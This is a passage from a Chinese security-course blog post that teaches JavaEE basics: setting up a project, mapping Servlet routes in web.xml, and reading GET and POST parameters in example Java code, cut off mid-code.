<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>小迪安全--安全开发下篇(4) | GoldY</title><meta name="author" content="GoldY"><meta name="copyright" content="GoldY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="小迪安全第二部分，安全开发讲解。">
<meta property="og:type" content="article">
<meta property="og:title" content="小迪安全--安全开发下篇(4)">
<meta property="og:url" content="https://www.geekgold.xyz/posts/1288cce5.html">
<meta property="og:site_name" content="GoldY">
<meta property="og:description" content="小迪安全第二部分，安全开发讲解。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.geekgold.xyz/img/xiao_f.jpg">
<meta property="article:published_time" content="2025-06-12T13:17:11.319Z">
<meta property="article:modified_time" content="2025-06-12T13:17:11.319Z">
<meta property="article:author" content="GoldY">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="小迪安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.geekgold.xyz/img/xiao_f.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "小迪安全--安全开发下篇(4)",
  "url": "https://www.geekgold.xyz/posts/1288cce5.html",
  "image": "https://www.geekgold.xyz/img/xiao_f.jpg",
  "datePublished": "2025-06-12T13:17:11.319Z",
  "dateModified": "2025-06-12T13:17:11.319Z",
  "author": [
    {
      "@type": "Person",
      "name": "GoldY",
      "url": "https://www.geekgold.xyz/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.geekgold.xyz/posts/1288cce5.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="bing-site-verification" content="E05CD8D6921B8F2AA32324DF2B267557"/><meta name="baidu-site-verification" content="codeva-tCktTl1n17"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":2,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '小迪安全--安全开发下篇(4)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bg2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/xiao_f.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">GoldY</span></a><a class="nav-page-title" href="/"><span class="site-name">小迪安全--安全开发下篇(4)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">小迪安全--安全开发下篇(4)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-12T13:17:11.319Z" title="发表于 2025-06-12 21:17:11">2025-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-12T13:17:11.319Z" title="更新于 2025-06-12 21:17:11">2025-06-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">13.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>55分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期"><a href="#JavaEE应用-Servlet路由技术-JDBC-Mybatis数据库-生命周期" class="headerlink" title="JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期"></a>JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Mybatis&spm=1001.2101.3001.7020">Mybatis</a>数据库&amp;生命周期</h1><h2 id="创建JavaEE项目"><a href="#创建JavaEE项目" class="headerlink" title="创建JavaEE项目"></a>创建JavaEE项目</h2><p>1、使用idea创建javaee</p>
<img src="/img/xiaodi/image-20250518202732576.png" alt="image-20250518202732576" style="zoom:50%;" />

<img src="/img/xiaodi/image-20250518202755472.png" alt="image-20250518202755472" style="zoom:50%;" />



<p>运行测试：</p>
<p><img src="/img/xiaodi/image-20250518214858660.png" alt="image-20250518214858660"></p>
<h2 id="JavaEE-HTTP-Servlet-路由-周期"><a href="#JavaEE-HTTP-Servlet-路由-周期" class="headerlink" title="JavaEE-HTTP-Servlet&amp;路由&amp;周期"></a>JavaEE-HTTP-Servlet&amp;路由&amp;周期</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52173163/article/details/121110753">JAVAEE的核心-Servlet_javaee的核心 csdn-CSDN博客</a></p>
<h3 id="Servlet介绍"><a href="#Servlet介绍" class="headerlink" title="Servlet介绍"></a>Servlet介绍</h3><p>Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。</p>
<h3 id="创建配置Servlet"><a href="#创建配置Servlet" class="headerlink" title="创建配置Servlet"></a>创建配置Servlet</h3><p>目录结构：</p>
<img src="/img/xiaodi/image-20250518203531816.png" alt="image-20250518203531816" style="zoom:50%;" />

<p><strong>1、创建一个类集成HttpServlet</strong></p>
<p>创建web.xml配置Servlet路由</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_6_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;6.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 定义Servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>index<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定Servlet类的完整路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置Servlet映射 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>index<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定Servlet的URL映射 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>创建IndexServlet.java文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承HttpServlet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="comment">//处理GET请求方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------doGet&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>页面测试</p>
<img src="/img/xiaodi/image-20250518215856244.png" alt="image-20250518215856244" style="zoom:50%;" />

<h4 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h4><p>IndexServlet.java</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">//继承HttpServlet类</span><br><span class="line">public class IndexServlet extends HelloServlet &#123;</span><br><span class="line">    //处理GET请求方法</span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest req, HttpServletResponse resp) &#123;</span><br><span class="line">        System.out.println(&quot;-----------------doGet&quot;);</span><br><span class="line">        resp.setContentType(&quot;text/html;charset=utf-8&quot;);</span><br><span class="line">        String name = req.getParameter(&quot;name&quot;);</span><br><span class="line">        System.out.println(&quot;name&quot; + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>web.xml无需修改</p>
<p>页面测试：</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/demo_war/index?name=hsdhs">localhost:8080&#x2F;demo_war&#x2F;index?name&#x3D;hsdhs</a></p>
<p><img src="/img/xiaodi/image-20250518220606454.png" alt="image-20250518220606454"></p>
<p><strong>注意：如果get参数获取不到，需要选择构造文件</strong></p>
<img src="/img/xiaodi/image-20250518220736057.png" alt="image-20250518220736057" style="zoom:50%;" />



<h4 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h4><p>IndexServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承HttpServlet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="comment">//处理GET请求方法</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void doGet(HttpServletRequest req, HttpServletResponse resp) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;-----------------doGet&quot;);</span></span><br><span class="line"><span class="comment">//        resp.setContentType(&quot;text/html;charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//        String name = req.getParameter(&quot;name&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name&quot; + name);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------doPost&quot;</span>);</span><br><span class="line">        <span class="comment">//设定内容类型的字符集为UTF-8</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取PrintWriter对象，用于向客户端发送响应数据</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明POST参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;address&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出POST参数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;name: &quot;</span> + name);</span><br><span class="line">        System.out.println(<span class="string">&quot;age: &quot;</span> + age);</span><br><span class="line">        System.out.println(<span class="string">&quot;address: &quot;</span> + address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 刷新输出缓冲区，确保数据被及时发送到客户端</span></span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭PrintWriter，释放资源</span></span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>web.xml无需修改</p>
<p>通过使用postman进行post请求构造</p>
<p><img src="/img/xiaodi/image-20250518221643086.png" alt="image-20250518221643086"></p>
<h4 id="其他内置方法"><a href="#其他内置方法" class="headerlink" title="其他内置方法"></a>其他内置方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用@WebServlet注解将Servlet映射到特定的URL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理GET请求的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------doGet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从请求中获取参数&quot;id&quot;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应的内容类型</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=GBK&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取PrintWriter以将HTML响应发送给客户端</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出从GET请求中收到的数据</span></span><br><span class="line">        out.println(<span class="string">&quot;这是GET请求的数据:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;id：&quot;</span> + id + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理POST请求的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 从请求中获取参数&quot;name&quot;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置响应的内容类型</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=GBK&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取PrintWriter以将HTML响应发送给客户端</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出从POST请求中收到的数据</span></span><br><span class="line">        out.println(<span class="string">&quot;这是post提交的数据&quot;</span>);</span><br><span class="line">        out.println(name);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span 